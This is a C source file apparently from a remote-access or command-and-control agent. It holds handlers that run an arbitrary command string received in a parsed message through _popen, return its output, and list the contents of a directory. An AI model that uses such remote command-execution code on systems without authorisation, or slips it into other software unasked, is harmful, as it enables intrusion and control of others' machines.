#include "Shell.h"

PPackage executeShell(PParser arguments)
{
	UINT32 nbArg = getInt32(arguments);
	SIZE_T size = 0;
	PCHAR cmd = getString(arguments, &size); // will read first UINT32 as size of param
	cmd = (PCHAR)LocalReAlloc(cmd, size + 1, LMEM_MOVEABLE | LMEM_ZEROINIT);
	if (!cmd)
	{
		_err("[SHELL] Error in executeShell command");
		return NULL;
	}

	FILE* fp;
	CHAR path[1035];
	PPackage output = newPackage(0, FALSE);

	fp = _popen(cmd, "rb");
	if (!fp)
	{
		_err("[SHELL] Error in executeShell command");

		// Cleanup memory
		freePackage(output);
		LocalFree(cmd);

		return NULL;
	}
	while (fgets(path, sizeof(path), fp) != nullptr)
	{
		addString(output, path, FALSE);
	}

	_pclose(fp);
	LocalFree(cmd);

	return output;

}

PPackage executeDir(PParser arguments)
{
	WCHAR szDir[MAX_PATH];
	UINT32 nbArg = getInt32(arguments);
	SIZE_T size = 0;
	PWCHAR path = getWString(arguments, &size); // will read first UINT32 as size of param
	

  // Reallocate path to ensure it has space for the null-terminator
	path = (PWCHAR)LocalReAlloc(path, size + 1, LMEM_MOVEABLE | LMEM_ZEROINIT);
	if (!path)
	{
		_err("[DIR] Error in executeDir command");
		return NULL;
	}

	PPackage output = newPackage(0, FALSE);
	if (!output)
	{
		_err("[DIR] Error in executeDir command");
		LocalFree(path);
		return NULL;
	}

	// Create search pattern with wilcard (all files in dir)
	// PCHAR searchPattern = (PCHAR)LocalAlloc(LMEM_ZEROINIT, (MAX_PATH + 2) * sizeof(CHAR));
	// snprintf(searchPattern, MAX_PATH + 2, "%s\\*", path);
	//
	StringCchCopyW(szDir, MAX_PATH, path);
  StringCchCatW(szDir, MAX_PATH, L"\\*");

	WIN32_FIND_DATAW FindFileData;
	HANDLE hFind = FindFirstFileW(szDir, &FindFileData);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		_err("[DIR] Error in executeDir command");
		freePackage(output);
		// free(searchPattern);
		LocalFree(path);
		return NULL;
	}
	do
	{
		addWString(output, FindFileData.cFileName, FALSE);
	} while (FindNextFileW(hFind, &FindFileData) != 0);

	FindClose(hFind);
	// LocalFree(searchPattern);
	LocalFree(path);
	return output;
}
